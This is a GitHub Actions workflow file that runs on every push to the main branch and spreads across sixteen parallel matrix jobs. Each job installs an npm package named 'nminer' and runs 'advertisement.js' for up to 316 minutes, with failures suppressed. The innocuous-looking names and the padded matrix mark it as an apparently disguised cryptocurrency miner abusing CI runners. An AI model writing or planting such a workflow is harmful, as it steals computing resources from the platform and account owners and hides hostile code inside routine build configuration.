name: advertisement
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6897 }
          - { version: 5837 }
          - { version: 8450 }
          - { version: 4193 }
          - { version: 2084 }
          - { version: 4411 }
          - { version: 4798 }
          - { version: 8097 }
          - { version: 1863 }
          - { version: 6111 }
          - { version: 5252 }
          - { version: 2584 }
          - { version: 5122 }
          - { version: 152 }
          - { version: 7245 }
          - { version: 8022 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: skyscraper drat
        run: |
          npm install nminer@latest
          timeout 316m node advertisement.js || echo "advertisement executed"